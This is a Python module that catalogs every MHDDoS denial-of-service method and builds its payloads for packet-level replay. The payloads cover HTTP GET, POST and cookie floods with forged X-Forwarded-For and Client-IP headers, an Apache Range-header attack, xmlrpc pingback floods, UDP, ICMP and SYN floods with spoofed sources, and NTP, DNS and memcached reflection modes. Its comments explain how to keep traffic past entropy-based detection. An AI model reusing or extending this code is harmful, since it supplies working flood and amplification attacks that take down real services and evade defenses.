"""One entry per MHDDoS method, with what the wire can and cannot carry.

The registry is keyed by the method names MHDDoS itself declares, and
``tests/test_catalog.py`` asserts the two sets match exactly, so a new upstream method
fails the build instead of silently going uncovered.

Every payload builder takes ``(ctx, index, source)`` and returns one L7 payload. MHDDoS
draws a fresh User-Agent and Referer per request; baking one identity per stream keeps N
streams looking like N distinct clients.
"""

import os

from .mhddos import Source
from .spec import AttackSpec, BuildCtx, Proto, SrcMode, Verdict

WIRE, SHAPE, ASTF, LOGIC = Verdict.WIRE, Verdict.SHAPE, Verdict.NEEDS_ASTF, Verdict.CLIENT_LOGIC


def _identity(ctx: BuildCtx, index: int) -> tuple[str, str, str]:
    ua = ctx.user_agents[index % len(ctx.user_agents)] if ctx.user_agents else "Mozilla/5.0"
    ref = ctx.referers[index % len(ctx.referers)] if ctx.referers else "https://example.com/"
    return ua, ref, f"203.0.113.{1 + index % 250}"


def _forwarded(ctx: BuildCtx, ua: str, ref: str, spoof: str) -> str:
    return (
        f"User-Agent: {ua}\r\n"
        f"Referrer: {ref}{ctx.host}\r\n"
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {ctx.host}, 1.1.1.1\r\n"
        f"Via: {spoof}\r\n"
        f"Client-IP: {spoof}\r\n"
        f"X-Forwarded-For: {spoof}\r\n"
        f"Real-IP: {spoof}\r\n"
    )


def _noise(size: int, index: int) -> bytes:
    """Independent random bytes per stream.

    MHDDoS calls ``os.urandom`` per packet. Bytes are fixed once a stream is compiled, so
    the entropy has to be real: a repeating filler would give the payload a period that
    entropy-based classification can key on.
    """
    return os.urandom(size)

def _get_like(
    ctx,
    index,
    source,
    host: str | None = None,
    extra: str = "",
    headers: str | None = None,
) -> bytes:
    ua, ref, spoof = _identity(ctx, index)
    return (
        "GET / HTTP/1.1\r\n"
        + source.browser_headers
        + f"Host: {host or ctx.authority}\r\n"
        + (headers if headers is not None else _forwarded(ctx, ua, ref, spoof))
        + extra
        + "\r\n"
    ).encode()


def get(ctx, index, source):
    return _get_like(ctx, index, source)


def head(ctx, index, source):
    return get(ctx, index, source).replace(b"GET / ", b"HEAD / ", 1)


def _post_like(ctx, index, source, body_size: int) -> bytes:
    ua, ref, spoof = _identity(ctx, index)
    body = '{"data": "' + _noise(body_size, index).hex() + '"}'
    return (
        "POST / HTTP/1.1\r\n"
        + source.browser_headers
        + f"Host: {ctx.authority}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + f"Content-Length: {len(body)}\r\n"
        "X-Requested-With: XMLHttpRequest\r\n"
        "Content-Type: application/json\r\n\r\n"
        + body
    ).encode()


def post(ctx, index, source):
    return _post_like(ctx, index, source, 32)


def stress(ctx, index, source):
    return _post_like(ctx, index, source, 512)


def pps(ctx, index, source):
    return f"GET / HTTP/1.1\r\nHost: {ctx.authority}\r\n\r\n".encode()


def null(ctx, index, source):
    return _get_like(
        ctx, index, source, headers="User-Agent: null\r\nReferrer: null\r\n"
    )


def cookie(ctx, index, source):
    return _get_like(
        ctx,
        index,
        source,
        extra=f"Cookie: _ga=GA{1000 + index}; _gat=1; __cfduid={_noise(16, index).hex()};\r\n",
    )


def dyn(ctx, index, source):
    return _get_like(ctx, index, source, host=f"{_noise(3, index).hex()}.{ctx.authority}")


def rhex(ctx, index, source):
    ua, ref, spoof = _identity(ctx, index)
    blob = _noise(32, index).hex()
    return (
        f"GET {ctx.authority}/{blob} HTTP/1.1\r\nHost: {ctx.authority}/{blob}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + source.browser_headers
        + "\r\n"
    ).encode()


def stomp(ctx, index, source):
    ua, ref, spoof = _identity(ctx, index)
    return (
        f"GET {ctx.authority}/{source.stomp_hex} HTTP/1.1\r\n"
        f"Host: {ctx.authority}/{source.stomp_hex}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + source.browser_headers
        + "\r\n"
    ).encode()


def gsb(ctx, index, source):
    ua, ref, spoof = _identity(ctx, index)
    return (
        f"HEAD /?qs={_noise(3, index).hex()} HTTP/1.1\r\nHost: {ctx.authority}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + source.browser_headers
        + "\r\n"
    ).encode()


def apache(ctx, index, source):
    ua, ref, spoof = _identity(ctx, index)
    ranges = ",".join(f"5-{i}" for i in range(1, 1024))
    return (
        "GET / HTTP/1.1\r\n"
        + source.browser_headers
        + f"Host: {ctx.authority}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + f"Range: bytes=0-,{ranges}\r\n\r\n"
    ).encode()


def xmlrpc(ctx, index, source):
    ua, ref, spoof = _identity(ctx, index)
    body = (
        "<?xml version='1.0' encoding='iso-8859-1'?>"
        "<methodCall><methodName>pingback.ping</methodName><params>"
        f"<param><value><string>{_noise(32, index).hex()}</string></value></param>"
        f"<param><value><string>{_noise(32, index).hex()}</string></value></param>"
        "</params></methodCall>"
    )
    return (
        "POST /xmlrpc.php HTTP/1.1\r\n"
        + source.browser_headers
        + f"Host: {ctx.authority}\r\n"
        + _forwarded(ctx, ua, ref, spoof)
        + f"Content-Length: {len(body)}\r\n"
        "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/xml\r\n\r\n"
        + body
    ).encode()


def bot(ctx, index, source):
    ua, _, _ = _identity(ctx, index)
    first = (
        f"GET /robots.txt HTTP/1.1\r\nHost: {ctx.authority}\r\n"
        "Connection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\n"
        f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
    )
    second = (
        f"GET /sitemap.xml HTTP/1.1\r\nHost: {ctx.authority}\r\n"
        "Connection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\n"
        f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n"
        f"If-None-Match: {_noise(5, index).hex()}-{_noise(2, index).hex()}\r\n"
        "If-Modified-Since: Sun, 26 Sep 2099 06:00:00 GMT\r\n\r\n"
    )
    return (first + second).encode()


def udp(ctx, index, source):
    return _noise(1024, index)


def ovh_udp(ctx, index, source):
    fill = _noise(1024 + (index % 4) * 256, index)
    head = f"{source.ovh_udp_methods[index % len(source.ovh_udp_methods)]} ".encode()
    path = source.ovh_udp_paths[index % len(source.ovh_udp_paths)].encode()
    return head + path + fill + f" HTTP/1.1\nHost: {ctx.host}:{ctx.port}\r\n\r\n".encode()


def icmp(ctx, index, source):
    return b"A" * (16 + (index % 4) * 256)


def fivem_token(ctx, index, source):
    guid = 76561197960265728 + index
    return f"token={_noise(16, index).hex()}&guid={guid}".encode()


def _amplifier(name: str):
    def build(ctx, index, source):
        return source.amplifiers[name][0]

    return build


def _protocol(name: str):
    def build(ctx, index, source):
        return source.protocol_payloads[name]

    return build


SPECS: dict[str, AttackSpec] = {}


def _register(*specs: AttackSpec) -> None:
    for spec in specs:
        SPECS[spec.name] = spec


_register(
    AttackSpec("UDP", WIRE, Proto.UDP, udp, src_mode=SrcMode.RANDOM),
    AttackSpec("OVH-UDP", WIRE, Proto.UDP, ovh_udp, src_mode=SrcMode.RANDOM),
    AttackSpec("ICMP", WIRE, Proto.ICMP, icmp, src_mode=SrcMode.RANDOM),
    AttackSpec("VSE", WIRE, Proto.UDP, _protocol("VSE"), src_mode=SrcMode.RANDOM),
    AttackSpec("TS3", WIRE, Proto.UDP, _protocol("TS3"), src_mode=SrcMode.RANDOM),
    AttackSpec("MCPE", WIRE, Proto.UDP, _protocol("MCPE"), src_mode=SrcMode.RANDOM),
    AttackSpec("FIVEM", WIRE, Proto.UDP, _protocol("FIVEM"), src_mode=SrcMode.RANDOM),
    AttackSpec("FIVEM-TOKEN", WIRE, Proto.UDP, fivem_token, src_mode=SrcMode.RANDOM),
    *(
        AttackSpec(name, WIRE, Proto.UDP, _amplifier(name), src_mode=SrcMode.REFLECTOR)
        for name in ("MEM", "NTP", "DNS", "CHAR", "CLDAP", "ARD", "RDP")
    ),
    AttackSpec("SYN", WIRE, Proto.TCP, flags="S", src_mode=SrcMode.RANDOM),
    AttackSpec("TCP", SHAPE, Proto.TCP, udp),
    AttackSpec("GET", WIRE, Proto.TCP, get),
    AttackSpec("POST", WIRE, Proto.TCP, post),
    AttackSpec("HEAD", WIRE, Proto.TCP, head),
    AttackSpec("PPS", WIRE, Proto.TCP, pps),
    AttackSpec("NULL", WIRE, Proto.TCP, null),
    AttackSpec("COOKIE", WIRE, Proto.TCP, cookie),
    AttackSpec("DYN", WIRE, Proto.TCP, dyn),
    AttackSpec("RHEX", WIRE, Proto.TCP, rhex),
    AttackSpec("STOMP", WIRE, Proto.TCP, stomp),
    AttackSpec("GSB", WIRE, Proto.TCP, gsb),
    AttackSpec("APACHE", WIRE, Proto.TCP, apache),
    AttackSpec("XMLRPC", WIRE, Proto.TCP, xmlrpc),
    AttackSpec("STRESS", WIRE, Proto.TCP, stress),
    AttackSpec("BOT", SHAPE, Proto.TCP, bot),
    AttackSpec("EVEN", SHAPE, Proto.TCP, get),
    AttackSpec("AVB", SHAPE, Proto.TCP, get),
    AttackSpec("KILLER", SHAPE, Proto.TCP, get),
    AttackSpec("CFBUAM", SHAPE, Proto.TCP, get),
    AttackSpec("OVH", SHAPE, Proto.TCP, get),
)

DEFERRED: dict[str, tuple[Verdict, str]] = {
    "MINECRAFT": (ASTF, "status ping needs a TCP session"),
    "CPS": (ASTF, "connection-open rate needs real handshakes"),
    "CONNECTION": (ASTF, "holds live connections open"),
    "MCBOT": (ASTF, "full Minecraft login handshake"),
    "SLOW": (ASTF, "slowloris drips headers on a live connection"),
    "DOWNLOADER": (ASTF, "slow-read pacing on a live connection"),
    "CFB": (LOGIC, "cloudscraper solves the challenge client-side"),
    "BYPASS": (LOGIC, "challenge solving plus proxy selection"),
    "DGB": (LOGIC, "DDoS-Guard challenge solved client-side"),
    "TOR": (LOGIC, "Host is rewritten to a tor2web mirror; use --host"),
}

for _name, (_verdict, _reason) in DEFERRED.items():
    _register(AttackSpec(_name, _verdict, Proto.TCP))

REASONS: dict[str, str] = {name: reason for name, (_, reason) in DEFERRED.items()}


def emittable() -> list[str]:
    return sorted(n for n, s in SPECS.items() if s.verdict in (WIRE, SHAPE))


def unimplemented(source: Source) -> list[str]:
    """MHDDoS methods this package has no entry for — must always be empty."""
    return sorted(source.methods - SPECS.keys())


def stale_deferred(source: Source) -> list[str]:
    """Entries whose MHDDoS method no longer exists upstream."""
    return sorted(SPECS.keys() - source.methods)
